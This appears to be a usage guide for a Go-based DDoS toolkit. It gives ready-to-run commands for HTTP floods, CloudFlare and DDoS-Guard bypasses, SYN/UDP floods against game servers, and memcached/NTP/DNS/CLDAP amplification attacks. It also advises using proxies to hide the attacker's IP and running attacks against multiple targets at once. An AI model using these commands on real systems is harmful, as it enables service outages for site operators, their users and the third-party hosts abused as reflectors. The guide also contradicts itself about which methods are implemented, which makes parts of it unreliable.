# DDoS Tools - Complete Usage Guide

**Maintained By**: Muhammad Thariq  
**Last Updated**: November 2025  
**Version**: 2.4 SNAPSHOT

## Table of Contents

- [Getting Started](#getting-started)
- [Command Syntax](#command-syntax)
- [Layer 7 Attacks](#layer-7-attacks)
- [Layer 4 Attacks](#layer-4-attacks)
- [Amplification Attacks](#amplification-attacks)
- [Interactive Tools](#interactive-tools)
- [Configuration](#configuration)
- [Proxy Management](#proxy-management)
- [Advanced Usage](#advanced-usage)
- [Troubleshooting](#troubleshooting)

---

## Getting Started

### Installation & Building

#### Prerequisites
- Go 1.22 or higher
- Git

#### Linux Installation

```bash
# Clone the repository
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools

# Build the project
go build -o ddos-tools main.go

# Run the tool
./ddos-tools HELP
```

#### macOS Installation

```bash
# Clone the repository
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools

# Build the project
go build -o ddos-tools main.go

# Run the tool
./ddos-tools HELP
```

#### Windows Installation

```powershell
# Clone the repository
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools

# Build the project
go build -o ddos-tools.exe main.go

# Run the tool
.\ddos-tools.exe HELP
```

Or using Command Prompt:
```cmd
REM Clone the repository
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools

REM Build the project
go build -o ddos-tools.exe main.go

REM Run the tool
ddos-tools.exe HELP
```

---

### Running the Tool

#### Linux / macOS

```bash
# Basic command structure
./ddos-tools [COMMAND] [ARGUMENTS]

# Examples
./ddos-tools HELP
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
```

#### Windows (PowerShell)

```powershell
# Basic command structure
.\ddos-tools.exe [COMMAND] [ARGUMENTS]

# Examples
.\ddos-tools.exe HELP
.\ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
```

#### Windows (Command Prompt)

```cmd
REM Basic command structure
ddos-tools.exe [COMMAND] [ARGUMENTS]

REM Examples
ddos-tools.exe HELP
ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
```

### Available Commands

- `HELP` - Display help information
- `TOOLS` - Launch interactive tools console
- `STOP` - Stop all running attacks
- `[METHOD]` - Execute an attack with specified method

---

## Command Syntax

### Platform-Specific Syntax

**Linux / macOS:**
```bash
./ddos-tools <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
```

**Windows (PowerShell):**
```powershell
.\ddos-tools.exe <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
```

**Windows (Command Prompt):**
```cmd
ddos-tools.exe <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
```

**Note**: For brevity, examples below use Linux/macOS syntax (`./ddos-tools`). Windows users should replace with `.\ddos-tools.exe` (PowerShell) or `ddos-tools.exe` (Command Prompt).

### Layer 7 Attack Syntax

```bash
./ddos-tools <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
```

**Parameters:**
- `<method>` - Attack method (e.g., GET, POST, CFB)
- `<url>` - Target URL (e.g., http://example.com)
- `<socks_type>` - Proxy type: 0=ALL, 1=HTTP, 4=SOCKS4, 5=SOCKS5, 6=RANDOM
- `<threads>` - Number of concurrent threads (e.g., 100)
- `<proxylist>` - Proxy file name from `files/proxies/` directory
- `<rpc>` - Requests per connection (e.g., 100)
- `<duration>` - Attack duration in seconds (e.g., 60)

### Layer 4 Attack Syntax

**Basic:**
```bash
./ddos-tools <method> <ip:port> <threads> <duration>
```

**Parameters:**
- `<method>` - Attack method (e.g., UDP, TCP, SYN)
- `<ip:port>` - Target IP and port (e.g., 192.168.1.1:80)
- `<threads>` - Number of concurrent threads
- `<duration>` - Attack duration in seconds

**With Proxies:**
```bash
./ddos-tools <method> <ip:port> <threads> <duration> <socks_type> <proxylist>
```

### Amplification Attacks

```bash
./ddos-tools <method> <ip:port> <threads> <duration> <reflector_file>
```

### Privileged Commands (Linux/macOS)

Some methods require root/administrator privileges:

**Linux/macOS:**
```bash
sudo ./ddos-tools SYN 192.168.1.1:80 500 60
sudo ./ddos-tools ICMP 192.168.1.1:0 300 60
```

**Windows (PowerShell - Run as Administrator):**
```powershell
.\ddos-tools.exe SYN 192.168.1.1:80 500 60
.\ddos-tools.exe ICMP 192.168.1.1:0 300 60
```

**Windows (Command Prompt - Run as Administrator):**
```cmd
ddos-tools.exe SYN 192.168.1.1:80 500 60
ddos-tools.exe ICMP 192.168.1.1:0 300 60
```

⚠️ **Note**: SYN and ICMP methods require elevated privileges on all platforms.

---

## Layer 7 Attacks

Layer 7 attacks target the application layer (HTTP/HTTPS).

### ✅ All 26 Methods Implemented (100% Complete!)

---

### Basic HTTP Methods

#### **GET** - HTTP GET Flood
Standard HTTP GET request flood.

```bash
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
```

**Use Case**: Basic HTTP flooding, resource exhaustion

---

#### **POST** - HTTP POST Flood
HTTP POST request flood with random data payloads.

```bash
./ddos-tools POST https://example.com/api 5 200 proxies.txt 50 120
```

**Use Case**: Testing form submissions, API endpoints, upload handlers

---

#### **HEAD** - HTTP HEAD Flood
HTTP HEAD request flood (lightweight, no body).

```bash
./ddos-tools HEAD http://example.com 5 150 proxies.txt 200 60
```

**Use Case**: Lightweight flooding, testing rate limits without bandwidth usage

---

#### **STRESS** - Mixed Stress Test
Combined GET/POST flood with large payloads for maximum stress.

```bash
./ddos-tools STRESS http://example.com 5 100 proxies.txt 100 90
```

**Use Case**: Comprehensive stress testing, resource exhaustion

---

#### **SLOW** - Slowloris Attack
Keep-alive connection exhaustion attack.

```bash
./ddos-tools SLOW http://example.com 5 200 proxies.txt 50 300
```

**Use Case**: Connection pool exhaustion, testing timeout configurations

---

#### **NULL** - HTTP NULL Flood
Minimal headers HTTP flood for speed.

```bash
./ddos-tools NULL http://example.com 5 300 proxies.txt 500 60
```

**Use Case**: High-speed flooding with minimal overhead

---

#### **COOKIE** - Cookie-Based Attack
HTTP flood with randomized cookie headers.

```bash
./ddos-tools COOKIE http://example.com 5 100 proxies.txt 100 60
```

**Use Case**: Testing session handling, cookie parsing vulnerabilities

---

#### **PPS** - Packets Per Second Optimized
Optimized for maximum packets per second delivery.

```bash
./ddos-tools PPS http://example.com 5 200 proxies.txt 1000 60
```

**Use Case**: Network saturation testing, bandwidth testing

---

### Bypass & Protection Evasion Methods

#### **CFB** - CloudFlare Bypass
CloudFlare bypass using cloudscraper-like techniques.

```bash
./ddos-tools CFB https://example.com 5 100 proxies.txt 50 120
```

**Use Case**: Testing CloudFlare protection, bypassing basic WAF rules

---

#### **BYPASS** - Generic WAF Bypass
Generic bypass method using standard HTTP client.

```bash
./ddos-tools BYPASS https://example.com 5 100 proxies.txt 100 60
```

**Use Case**: Testing generic WAF protection, standard bypass techniques

---

#### **OVH** - OVH-Specific Attack
OVH-optimized attack with limited RPC (max 5).

```bash
./ddos-tools OVH http://example.com 5 100 proxies.txt 5 60
```

**Use Case**: Testing OVH DDoS protection, limited request attacks

---

#### **DYN** - Dynamic Host Header Attack
Dynamic host header manipulation with IP spoofing.

```bash
./ddos-tools DYN http://example.com 5 150 proxies.txt 100 90
```

**Use Case**: Testing virtual host configurations, host header validation

---

#### **DGB** - DDoS Guard Bypass
DDoS Guard bypass with timing delays.

```bash
./ddos-tools DGB https://example.com 5 100 proxies.txt 5 120
```

**Use Case**: Testing DDoS Guard protection, challenge-response bypass

---

#### **AVB** - Anti-Bot Bypass
Anti-bot protection bypass with request delays.

```bash
./ddos-tools AVB http://example.com 5 100 proxies.txt 100 60
```

**Use Case**: Testing bot detection, rate limiting with delays

---

#### **CFBUAM** - CloudFlare Under Attack Mode Bypass
CloudFlare UAM bypass with 5-second challenge wait.

```bash
./ddos-tools CFBUAM https://example.com 5 50 proxies.txt 100 180
```

**Use Case**: Testing CloudFlare "I'm Under Attack" mode, challenge solving

---

### Advanced Attack Methods

#### **EVEN** - Event-Based Attack
Sends requests and reads responses to keep connections alive.

```bash
./ddos-tools EVEN http://example.com 5 100 proxies.txt 100 120
```

**Use Case**: Connection persistence testing, keep-alive exploitation

---

#### **GSB** - Google Search Bot Simulation
Simulates Google Search Bot with query strings and special headers.

```bash
./ddos-tools GSB http://example.com 5 100 proxies.txt 200 60
```

**Use Case**: Testing bot detection, search engine crawler handling

---

#### **APACHE** - Apache Range Header Attack
Apache Range header vulnerability (CVE-2011-3192) exploitation.

```bash
./ddos-tools APACHE http://example.com 5 50 proxies.txt 10 60
```

**Use Case**: Testing Apache range header parsing, resource exhaustion

⚠️ **Note**: Targets Apache web servers with range header vulnerability

---

#### **XMLRPC** - XML-RPC Pingback Attack
WordPress XML-RPC pingback flood.

```bash
./ddos-tools XMLRPC https://example.com/xmlrpc.php 5 100 proxies.txt 50 90
```

**Use Case**: Testing WordPress XML-RPC protection, pingback abuse

---

#### **BOT** - Bot Simulation Attack
Simulates search engine bots requesting robots.txt and sitemap.xml.

```bash
./ddos-tools BOT http://example.com 5 100 proxies.txt 100 60
```

**Use Case**: Testing bot detection, crawler rate limiting

---

#### **BOMB** - High-Volume Bombardment
High-volume attack for maximum request throughput.

```bash
./ddos-tools BOMB http://example.com 5 200 proxies.txt 500 60
```

**Use Case**: Bandwidth saturation, maximum throughput testing

---

#### **DOWNLOADER** - Download and Read Attack
Downloads and reads all response data to maximize bandwidth usage.

```bash
./ddos-tools DOWNLOADER http://example.com/large-file 5 100 proxies.txt 50 120
```

**Use Case**: Bandwidth exhaustion, testing large file delivery

---

#### **KILLER** - Multi-Spawn GET Attack
Spawns multiple concurrent GET requests using goroutines.

```bash
./ddos-tools KILLER http://example.com 5 50 proxies.txt 100 60
```

**Use Case**: Extreme concurrency testing, connection pool exhaustion

⚠️ **Warning**: Spawns many goroutines, use moderate RPC values

---

#### **TOR** - Tor Network Bypass
Tor network (.onion) access via tor2web gateways.

```bash
./ddos-tools TOR http://example.onion 5 50 proxies.txt 50 90
```

**Use Case**: Testing .onion sites, tor2web gateway stress testing

**Supported Gateways**: onion.city, onion.cab, onion.direct, onion.sh, onion.link, etc.

---

#### **RHEX** - Random Hex Path Attack
Generates random hex paths for each request.

```bash
./ddos-tools RHEX http://example.com 5 100 proxies.txt 200 60
```

**Use Case**: Testing path normalization, cache poisoning, 404 handling

---

#### **STOMP** - Special Hex Pattern Attack
Uses special hex patterns targeting CloudFlare CDN endpoints.

```bash
./ddos-tools STOMP http://example.com 5 100 proxies.txt 100 90
```

**Use Case**: Testing CDN protection, special character handling, path validation

---

### Layer 7 Method Summary

| Method | Type | Speed | Complexity | Target |
|--------|------|-------|------------|--------|
| GET | Basic | Fast | Low | General |
| POST | Basic | Medium | Low | Forms/APIs |
| HEAD | Basic | Very Fast | Low | General |
| STRESS | Basic | Medium | Medium | General |
| SLOW | Basic | Slow | Medium | Connections |
| NULL | Basic | Very Fast | Low | General |
| COOKIE | Basic | Fast | Low | Sessions |
| PPS | Basic | Very Fast | Low | Network |
| CFB | Bypass | Medium | High | CloudFlare |
| BYPASS | Bypass | Medium | Medium | WAF |
| OVH | Bypass | Slow | Medium | OVH |
| DYN | Bypass | Medium | Medium | Vhosts |
| DGB | Bypass | Slow | High | DDoS Guard |
| AVB | Bypass | Slow | Medium | Anti-Bot |
| CFBUAM | Bypass | Very Slow | High | CloudFlare UAM |
| EVEN | Advanced | Medium | Medium | Keep-Alive |
| GSB | Advanced | Fast | Medium | Bot Detection |
| APACHE | Advanced | Medium | High | Apache |
| XMLRPC | Advanced | Medium | Medium | WordPress |
| BOT | Advanced | Medium | Medium | Crawlers |
| BOMB | Advanced | Very Fast | Low | Bandwidth |
| DOWNLOADER | Advanced | Slow | Low | Bandwidth |
| KILLER | Advanced | Very Fast | High | Concurrency |
| TOR | Advanced | Slow | High | Tor Sites |
| RHEX | Advanced | Fast | Medium | Paths |
| STOMP | Advanced | Medium | High | CDN |

```bash
./ddos-tools HEAD http://example.com 1 150 http-proxies.txt 100 60
```

#### **STRESS** - Mixed Stress Test
Combined stress testing with large payloads.

```bash
./ddos-tools STRESS http://example.com 5 100 proxies.txt 50 60
```

#### **SLOW** - Slowloris Attack
Keeps connections open by slowly sending headers.

```bash
./ddos-tools SLOW http://example.com 5 500 proxies.txt 1 300
```

#### **NULL** - HTTP NULL Flood
Sends requests with minimal headers.

```bash
./ddos-tools NULL http://example.com 5 100 proxies.txt 100 60
```

#### **COOKIE** - Cookie-based Attack
Sends requests with randomized cookies.

```bash
./ddos-tools COOKIE https://example.com 5 100 proxies.txt 100 60
```

#### **PPS** - Packets Per Second Optimized
High-speed packet flooding optimized for PPS.

```bash
./ddos-tools PPS http://example.com 5 100 proxies.txt 100 60
```

### 🚧 Coming Soon Methods (19/27)

The following Layer 7 methods are defined but implementation is in progress:

- **CFB** - CloudFlare Bypass
- **BYPASS** - WAF Bypass techniques
- **OVH** - OVH-specific bypass
- **DYN** - Dynamic request patterns
- **EVEN** - Event-based flooding
- **GSB** - Google Safe Browsing bypass
- **DGB** - DDoS Guard bypass
- **AVB** - Advanced bypass
- **CFBUAM** - CloudFlare Under Attack Mode bypass
- **APACHE** - Apache-specific attack
- **XMLRPC** - WordPress XML-RPC flood
- **BOT** - Botnet simulation
- **BOMB** - Compression bomb
- **DOWNLOADER** - Download flood
- **KILLER** - Resource exhaustion
- **TOR** - Tor-based attack
- **RHEX** - Random hex flood
- **STOMP** - STOMP protocol attack

### Layer 7 Examples

```bash
# Simple GET attack with 100 threads for 60 seconds
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60

# POST attack with SOCKS5 proxies, 200 threads, 2 minutes
./ddos-tools POST https://api.example.com 5 200 socks5.txt 50 120

# Slowloris attack with 500 connections, 5 minutes
./ddos-tools SLOW http://example.com 5 500 proxies.txt 1 300

# HEAD flood without proxies (direct connection)
./ddos-tools HEAD http://example.com 0 100 none 100 60
```

---

## Layer 4 Attacks

Layer 4 attacks target the transport layer (TCP/UDP).

### ✅ Implemented Methods (14/14 - 100% Complete!)

#### **TCP** - TCP Flood
Establishes TCP connections and sends random data.

```bash
./ddos-tools TCP 192.168.1.1:80 100 60
```

#### **UDP** - UDP Flood
Sends UDP packets to the target.

```bash
./ddos-tools UDP 192.168.1.1:53 200 120
```

#### **SYN** - SYN Flood
TCP SYN flood attack (requires elevated privileges).

```bash
sudo ./ddos-tools SYN 192.168.1.1:80 500 60
```

#### **MINECRAFT** - Minecraft Server Flood
Specialized attack for Minecraft servers.

```bash
./ddos-tools MINECRAFT mc.example.com:25565 100 60
```

#### **VSE** - Valve Source Engine Query Flood
Targets Source Engine game servers.

```bash
./ddos-tools VSE 192.168.1.1:27015 100 60
```

#### **TS3** - TeamSpeak 3 Query Flood
Floods TeamSpeak 3 servers with query packets.

```bash
./ddos-tools TS3 192.168.1.1:9987 100 60
```

#### **FIVEM** - FiveM Server Flood
Targets FiveM (GTA V multiplayer) servers.

```bash
./ddos-tools FIVEM 192.168.1.1:30120 100 60
```

#### **FIVEM-TOKEN** - FiveM Token Flood
Floods FiveM servers with token requests.

```bash
./ddos-tools FIVEM-TOKEN 192.168.1.1:30120 100 60
```

#### **MCPE** - Minecraft Pocket Edition Flood
Targets Minecraft Bedrock/PE servers.

```bash
./ddos-tools MCPE 192.168.1.1:19132 100 60
```

#### **CPS** - Connections Per Second
Opens and closes connections rapidly.

```bash
./ddos-tools CPS 192.168.1.1:80 100 60
```

#### **CONNECTION** - Connection Hold
Establishes and maintains connections.

```bash
./ddos-tools CONNECTION 192.168.1.1:80 500 60
```

#### **OVH-UDP** - OVH-Optimized UDP Flood
UDP flood with HTTP-like payloads optimized for OVH bypass.

```bash
./ddos-tools OVH-UDP 192.168.1.1:80 100 60
```

#### **MCBOT** - Minecraft Bot Flood
Simulates Minecraft bots connecting and spamming chat.

```bash
./ddos-tools MCBOT mc.example.com:25565 50 120
```

#### **ICMP** - ICMP Flood
Sends ICMP echo requests (requires elevated privileges for raw sockets).

```bash
sudo ./ddos-tools ICMP 192.168.1.1:0 100 60
```

### Layer 4 Examples

```bash
# UDP flood on DNS server
./ddos-tools UDP 8.8.8.8:53 200 60

# SYN flood (requires root)
sudo ./ddos-tools SYN 192.168.1.1:443 1000 120

# Minecraft server stress test
./ddos-tools MINECRAFT play.example.com:25565 100 300

# Game server query flood
./ddos-tools VSE 192.168.1.1:27015 150 60

# Connection exhaustion attack
./ddos-tools CONNECTION 192.168.1.1:80 500 120
```

---

## Amplification Attacks

Amplification attacks use third-party servers to amplify traffic.

### ✅ Implemented Methods (7/7 - 100% Complete!)

All amplification methods are fully implemented and ready to use:

#### **MEM** - Memcached Amplification
Uses Memcached servers to amplify traffic.

```bash
./ddos-tools MEM 192.168.1.1:11211 100 60 memcached-reflectors.txt
```

#### **NTP** - NTP Amplification
Uses NTP servers with monlist command for amplification.

```bash
./ddos-tools NTP 192.168.1.1:123 100 60 ntp-reflectors.txt
```

#### **DNS** - DNS Amplification
Uses DNS servers with ANY query for maximum amplification.

```bash
./ddos-tools DNS 192.168.1.1:53 100 60 dns-reflectors.txt
```

#### **CHAR** - CharGen Amplification
Uses CharGen protocol servers for amplification.

```bash
./ddos-tools CHAR 192.168.1.1:19 100 60 chargen-reflectors.txt
```

#### **CLDAP** - CLDAP Amplification
Uses CLDAP (Connectionless LDAP) for amplification.

```bash
./ddos-tools CLDAP 192.168.1.1:389 100 60 cldap-reflectors.txt
```

#### **ARD** - Apple Remote Desktop Amplification
Uses ARD protocol for traffic amplification.

```bash
./ddos-tools ARD 192.168.1.1:3283 100 60 ard-reflectors.txt
```

#### **RDP** - RDP Amplification
Uses RDP connection requests for amplification.

```bash
./ddos-tools RDP 192.168.1.1:3389 100 60 rdp-reflectors.txt
```

### Syntax

```bash
./ddos-tools <method> <target:port> <threads> <duration> <reflector_file>
```

**Note:** Amplification attacks require a file containing reflector IP addresses (one per line) in the `files/` directory. These attacks may require elevated privileges for raw socket operations.

---

## Interactive Tools

Launch the interactive tools console:

```bash
./ddos-tools TOOLS
```

### Available Tools

#### ✅ **DSTAT** - Network Statistics Monitor
Real-time display of network and system statistics.

```
Command: DSTAT

Output:
--- Network & System Statistics ---
Bytes Sent:       1.25 MiB/s
Bytes Received:   2.50 MiB/s
Packets Sent:     1.2k/s
Packets Received: 2.5k/s
Memory Usage:     256 MB / 8192 MB (3.13%)
Goroutines:       42
-----------------------------------
```

Press Ctrl+C to stop monitoring.

#### ✅ **CHECK** - Website Availability Checker
Checks if a website is online and returns HTTP status.

```
Command: CHECK
Prompt: give-me-ipaddress# http://example.com

Output:
Status Code: 200
Status: ONLINE
```

#### ✅ **INFO** - IP Information Lookup
Retrieves geolocation and ISP information for an IP/domain.

```
Command: INFO
Prompt: give-me-ipaddress# example.com

Output:
Country: United States
City: Los Angeles
Org: Example Corp
ISP: Example ISP
Region: California
```

#### ✅ **TSSRV** - TeamSpeak SRV Resolver
Resolves TeamSpeak SRV DNS records.

```
Command: TSSRV
Prompt: give-me-domain# example.com

Output:
_ts3._udp.example.com: ts.example.com:9987
_tsdns._tcp.example.com: Not found
```

#### ✅ **PING** - Advanced TCP Ping
Performs TCP ping to check connectivity and latency.

```
Command: PING
Prompt: give-me-ipaddress# example.com

Output:
Address: 93.184.216.34
Reply from 93.184.216.34: time=45.23ms
Reply from 93.184.216.34: time=44.89ms
Reply from 93.184.216.34: time=45.67ms
Reply from 93.184.216.34: time=45.12ms
Reply from 93.184.216.34: time=45.34ms

Ping Statistics:
Packets: Sent = 5, Received = 5, Lost = 0
Average RTT: 45.25ms
Status: ONLINE
```

#### 🚧 **CFIP** - CloudFlare IP Finder (Coming Soon)
Will find CloudFlare IP ranges.

#### 🚧 **DNS** - DNS Lookup Tool (Coming Soon)
Advanced DNS query and lookup functionality.

### Console Commands

While in the tools console:

- `HELP` - Show available tools
- `CLEAR` - Clear the screen
- `BACK` - Return to previous menu (in sub-tools)
- `EXIT`, `QUIT`, `Q`, `E`, `LOGOUT`, `CLOSE` - Exit the console

---

## Configuration

### config.json

The configuration file is located in the project root.

```json
{
  "MCBOT": "MHDDoS_",
  "MINECRAFT_DEFAULT_PROTOCOL": 47,
  "proxy-providers": [
    {
      "type": 1,
      "url": "http://example.com/proxies.txt",
      "timeout": 5
    },
    {
      "type": 5,
      "url": "http://example.com/socks5.txt",
      "timeout": 10
    }
  ]
}
```

### Configuration Options

- **MCBOT**: Prefix for Minecraft bot names (default: "MHDDoS_")
- **MINECRAFT_DEFAULT_PROTOCOL**: Minecraft protocol version (default: 47)
- **proxy-providers**: Array of proxy provider configurations

### Proxy Provider Types

- `1` - HTTP proxies
- `4` - SOCKS4 proxies
- `5` - SOCKS5 proxies

---

## Proxy Management

### Proxy File Format

Proxies should be listed one per line in text files:

```
192.168.1.1:8080
10.0.0.1:1080
proxy.example.com:3128
```

### Supported Proxy Formats

1. **Simple format**: `host:port`
2. **URL format**: `http://host:port`, `socks5://host:port`
3. **With protocol**: `socks4://host:port`

### Proxy File Location

Place proxy files in: `files/proxies/`

Example:
```
files/proxies/http.txt
files/proxies/socks5.txt
files/proxies/premium.txt
```

### Using Proxies

```bash
# Use HTTP proxies
./ddos-tools GET http://example.com 1 100 http.txt 100 60

# Use SOCKS5 proxies
./ddos-tools GET http://example.com 5 100 socks5.txt 100 60

# Use random proxy type
./ddos-tools GET http://example.com 6 100 mixed.txt 100 60

# No proxies (direct connection)
./ddos-tools GET http://example.com 0 100 none 100 60
```

---

## Advanced Usage

### User Agent Customization

Create `files/useragent.txt` with custom user agents:

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/14.0
Mozilla/5.0 (X11; Linux x86_64) Firefox/89.0
```

If not provided, default user agents are used automatically.

### Custom Referers

Create `files/referers.txt` with custom referers:

```
https://www.google.com/
https://www.facebook.com/
https://www.twitter.com/
```

### Real-time Monitoring Output

During an attack, you'll see real-time statistics:

```
Target: http://example.com, Method: GET, PPS: 12.5k, BPS: 2.34 MiB / 45.00%
Target: http://example.com, Method: GET, PPS: 13.2k, BPS: 2.45 MiB / 50.00%
```

- **PPS**: Packets/Requests Per Second
- **BPS**: Bytes Per Second
- **Percentage**: Attack progress

### Graceful Shutdown

Press `Ctrl+C` to gracefully stop an attack:

```
^C
Attack stopped by user
```

### Multiple Targets (Script)

Create a bash script for multiple targets:

```bash
#!/bin/bash
./ddos-tools GET http://target1.com 5 100 proxies.txt 100 60 &
./ddos-tools POST http://target2.com 5 100 proxies.txt 100 60 &
./ddos-tools UDP 192.168.1.1:80 100 60 &
wait
```

---

## Troubleshooting

### Platform-Specific Issues

#### Linux/macOS: "Permission denied" for SYN/ICMP
**Solution**: Run with sudo
```bash
sudo ./ddos-tools SYN 192.168.1.1:80 100 60
sudo ./ddos-tools ICMP 192.168.1.1:0 300 60
```

#### Windows: "Permission denied" for SYN/ICMP
**Solution**: Run PowerShell or Command Prompt as Administrator
1. Right-click on PowerShell/Command Prompt
2. Select "Run as Administrator"
3. Navigate to ddos-tools directory
4. Run the command:
```powershell
.\ddos-tools.exe SYN 192.168.1.1:80 100 60
```

#### Windows: "ddos-tools is not recognized"
**Solution**: Use correct path syntax
```powershell
# PowerShell - use .\
.\ddos-tools.exe HELP

# Command Prompt - use .\ or full name
ddos-tools.exe HELP
```

#### macOS: "ddos-tools cannot be opened because it is from an unidentified developer"
**Solution**: Allow the application in System Preferences
```bash
# Method 1: Remove quarantine attribute
xattr -d com.apple.quarantine ddos-tools

# Method 2: System Preferences → Security & Privacy → Allow
```

### Common Issues

#### "Cannot resolve hostname"
**Solution**: Check target hostname/IP
```bash
# Use IP directly
./ddos-tools UDP 192.168.1.1:80 100 60

# Or verify DNS resolution
nslookup example.com
```

#### "No proxies loaded"
**Solution**: Check proxy file exists and format is correct
```bash
# Verify file exists
ls -la files/proxies/

# Check file format
cat files/proxies/proxies.txt
```

#### Low performance
**Solutions**:
- Increase thread count
- Use more proxies
- Check system resources (CPU/RAM)
- Reduce RPC value for Layer 7

#### "Config file not found"
**Solution**: Create default config.json
```bash
cat > config.json << 'EOF'
{
  "MCBOT": "MHDDoS_",
  "MINECRAFT_DEFAULT_PROTOCOL": 47,
  "proxy-providers": []
}
EOF
```

### Cross-Platform Tips

#### File Paths

**Linux/macOS:**
```bash
# Relative paths use forward slashes
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
./ddos-tools GET http://example.com 5 100 files/proxies/proxies.txt 100 60
```

**Windows (PowerShell):**
```powershell
# Can use forward or back slashes
.\ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
.\ddos-tools.exe GET http://example.com 5 100 files\proxies\proxies.txt 100 60
```

**Windows (Command Prompt):**
```cmd
REM Use back slashes
ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
ddos-tools.exe GET http://example.com 5 100 files\proxies\proxies.txt 100 60
```

#### Background Execution

**Linux/macOS:**
```bash
# Run in background
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60 &

# Run in background with nohup
nohup ./ddos-tools GET http://example.com 5 100 proxies.txt 100 60 &

# Run in screen/tmux session
screen -S ddos
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
# Detach: Ctrl+A, D
```

**Windows (PowerShell):**
```powershell
# Run in new window
Start-Process .\ddos-tools.exe -ArgumentList "GET","http://example.com","5","100","proxies.txt","100","60"

# Run in background job
Start-Job -ScriptBlock { .\ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60 }
```

**Windows (Command Prompt):**
```cmd
REM Run in new window
start ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
```

#### Stopping Attacks

**Linux/macOS:**
```bash
# Ctrl+C to stop current attack
# Or find and kill process
ps aux | grep ddos-tools
kill <PID>

# Kill all instances
pkill ddos-tools
```

**Windows (PowerShell):**
```powershell
# Ctrl+C to stop current attack
# Or find and stop process
Get-Process ddos-tools | Stop-Process

# Stop specific process
Stop-Process -Name ddos-tools -Force
```

**Windows (Command Prompt):**
```cmd
REM Ctrl+C to stop current attack
REM Or find and kill process
tasklist | findstr ddos-tools
taskkill /IM ddos-tools.exe /F
```

### Performance Tuning

#### Optimal Thread Count by Platform

**Linux:**
- **Layer 7**: 100-500 threads
- **Layer 4**: 200-1000 threads
- Can handle more threads due to efficient I/O

**macOS:**
- **Layer 7**: 100-400 threads
- **Layer 4**: 200-800 threads
- Similar to Linux but may have lower limits

**Windows:**
- **Layer 7**: 50-300 threads
- **Layer 4**: 100-500 threads
- Lower due to different I/O model

#### RPC (Requests Per Connection)
- **High RPC (100-200)**: More efficient, less proxy rotation
- **Low RPC (1-50)**: More proxy rotation, better distribution

#### Duration
- Start with shorter durations (60-120 seconds) for testing
- Increase for sustained stress tests

### System Requirements

**Minimum:**
- 2 CPU cores
- 2 GB RAM
- 100 Mbps network
- Windows 10/macOS 10.15/Linux kernel 4.x or higher

**Recommended:**
- 4+ CPU cores
- 8 GB RAM
- 1 Gbps network
- Windows 11/macOS 12+/Linux kernel 5.x or higher
- 4+ GB RAM
- 1 Gbps network

---

## Best Practices

1. **Always test on authorized systems only**
2. **Start with low thread counts** and increase gradually
3. **Monitor system resources** during attacks
4. **Use proxies** to distribute load and protect your IP
5. **Keep proxy lists updated** for better results
6. **Test in controlled environments** first
7. **Document your tests** for compliance and reporting
8. **Respect rate limits** and be responsible

---

## Implementation Status Summary

### ✅ Fully Implemented

#### **Layer 7 (8/27 - 30%)**
- GET, POST, HEAD, STRESS, SLOW, NULL, COOKIE, PPS

#### **Layer 4 (14/14 - 100%)**
- TCP, UDP, SYN, MINECRAFT, VSE, TS3, FIVEM, FIVEM-TOKEN, MCPE, CPS, CONNECTION, OVH-UDP, MCBOT, ICMP

#### **Amplification (7/7 - 100%)**
- MEM, NTP, DNS, CHAR, CLDAP, ARD, RDP

#### **Tools (5/7 - 71%)**
- DSTAT, CHECK, INFO, TSSRV, PING

#### **Core Features**
- ✅ Proxy support (HTTP, SOCKS4, SOCKS5)
- ✅ Real-time monitoring (PPS, BPS, progress)
- ✅ Graceful shutdown (Ctrl+C)
- ✅ IPv6 compatibility
- ✅ Cross-platform (Linux, Windows, macOS)
- ✅ Modern Go 1.22+ idioms

### 🚧 In Development (19/27 Layer 7 Methods)
- **Layer 7**: CFB, BYPASS, OVH, DYN, EVEN, GSB, DGB, AVB, CFBUAM, APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER, TOR, RHEX, STOMP
- **Tools**: CFIP, DNS lookup

### 📋 Planned Features
- Web UI for easier management
- Distributed attack coordination
- Advanced analytics and reporting
- Custom attack pattern scripting
- REST API for integration
- Docker containerization

---

## Getting Help

If you encounter issues:

1. Check this documentation
2. Review [README.md](README.md)
3. Check [GitHub Issues](https://github.com/go-ddos-tools/ddos-tools/issues)
4. Run with verbose logging (if available)
5. Verify your configuration

---

## 📈 Overall Progress

- **Total Methods**: 48 attack methods across all layers
- **Implemented**: 29 methods (60%)
- **Layer 4 & Amplification**: 100% complete (21/21)
- **Layer 7**: 30% complete (8/27)
- **Tools**: 71% complete (5/7)

**Last Updated**: November 2025
**Version**: 2.4 SNAPSHOT (Go)
**Status**: Active Development - Production Ready for Layer 4 & Amplification
